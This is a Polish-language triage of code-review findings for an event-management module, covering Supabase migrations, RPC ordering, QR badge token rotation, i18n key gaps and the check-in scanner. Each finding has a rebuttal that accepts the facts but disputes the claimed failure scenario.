- **admin_event_pages_reorder polega na niegwarantowanej kolejnosci unnest i milczy przy niepelnej liscie** (Informacje ogólne, branding, strony i menu) — Kod RPC jest taki, jak opisano (supabase/migrations/20260826120000_event_pages_and_public_columns.sql:515-527, identycznie w pozniejszej 20260826114616:345-368: row_number() OVER () nad unnest, GET DIAGNOSTICS bez porownania z cardinality(p_ids)), ale OPISANY SCENARIUSZ AWARII jest nieosiagalny. Mutacja uniewaznia zapytanie listy natychmiast po sukcesie: […]
- **Wydanie partii identyfikatorow rotuje kod QR kazdego uczestnika i uniewaznia kody juz wydane** (Onsite) — Rotacja istnieje dokladnie tam, gdzie wskazano (20260828080509_557b177c...sql:82-89), ale nie jest usterka, tylko zadeklarowana decyzja projektowa - naglowek tej samej migracji, linie 1-5: 'QR JEST WYDAWANY, NIE ODCZYTYWANY. Baza trzyma wylacznie SHA-256 kodu, wiec wydruk identyfikatora MUSI wystawic nowy token - stary przestaje dzialac i to jest cecha, nie usterka: […]
- **Brak pgTAP na uprawnieniach grup i na sponsorach - kryteria odbioru E5 i E6 nie sa pilnowane** (Grupy i sponsorzy) — Testy istnieja, tylko nie w supabase/tests. Modul ma wlasny harness replayujacy migracje na czystym Postgresie: scripts/events-harness/run.sh + scripts/events-harness/runtime_test.d/ (11 plikow, 8660 linii), wciagany znacznikiem 'events-harness: include' widocznym m.in. w naglowku 20260826182500:85-92. Konkretnie obalam kazdy z wymienionych 'brakow': `tier_full` - […]
- **Widgety wydarzeń nie mają kontekstu wydarzenia — każde wystąpienie trzyma własny, ręcznie wklejony `eventId`** (Widgety buildera) — Warstwa faktów się zgadza — `rg 'EventContext|useCurrentEvent|currentEventCtx' src` daje zero trafień, a wiązanie idzie przez `setContent("eventId", id)` (SpeakersEditor.tsx:226, MeetingBookingEditor.tsx:84, EventCountdownCardEditor) — ale ustalenie nie opisuje defektu ani luki wobec spec, a jego scenariusz jest nieosiągalny. Po pierwsze: funkcji duplikowania poddrzewa stron w […]
- **Migracja 20260824080000 nie jest idempotentna — powtorny przebieg wysypuje sie na politykach i triggerach** (Baza: RLS, granty, SECURITY DEFINER) — Sama obserwacja jest prawdziwa (`grep -c` na supabase/migrations/20260824080000_event_admissions_packages_coupons.sql: 7 x CREATE POLICY, 0 x DROP POLICY; CREATE TRIGGER w liniach 213, 326, 443, 564 bez DROP, tylko :607-608 ma pare), ale opis SKUTKU jest nietrafny i scenariusz nieosiagalny. Po pierwsze, bramka `check:sql-migration-replay` NIE wykonuje SQL: to statyczny […]
- **`missing_required_consents` z `event_register` nie ma klucza i18n - uczestnik, który nie zaznaczył zgody obowiązkowej, dostaje komunikat […]** (Parytet RPC ↔ klient) — Sama luka slownikowa jest faktem (RAISE w 20260827220945_d4ece1f0...sql:402-404; brak klucza missingRequiredConsents - src/lib/i18n-event-registration.ts:114-116 ma tylko consentRequired/missingRequiredFields/termsRequired, grep po src/ bez trafien; paramsOf w publicRegistrationErrors.ts:43-46 rzeczywiscie zna tylko missing_required_fields i terms_required). Opisany scenariusz […]
- **Osiem kodów walidacji układu identyfikatora (`invalid_element_*`) nie ma kluczy i18n - edytor szablonu nie mówi, który blok jest zły** (Parytet RPC ↔ klient) — Brak kluczy jest faktem (adminEventOnsite.errors w src/lib/i18n-admin-event-onsite.ts:133-176 nie ma zadnego invalidElement*, grep 'invalidElement' po src/ bez trafien; kody podnoszone w 20260825061559_57396b2b...sql:161-197). Ale opisany scenariusz nie istnieje: w module NIE MA edytora ukladu identyfikatora. BadgeTemplateDialog.tsx nie ma zadnego pola dotyczacego blokow (grep […]
- **Źródło odprawy `self_service` jest w bazie i w filtrze dziennika, ale żaden klient go nie wysyła - filtr zawsze zwraca pustkę** (Parytet RPC ↔ klient) — Czesc faktograficzna sie broni (wartosc powstaje tylko z flagi p_payload->>'self_service' w 20260824102151_a44a63c0...sql:257-261, a recordCheckinScan nie przekazuje jej - src/lib/events/scannerApi.ts:203-212 wysyla wylacznie device_token, code, checkpoint_id, direction, client_scan_uid, device_scanned_at), ale opisany skutek jest zmyslony: W PANELU NIE MA FILTRA ZRODLA. […]
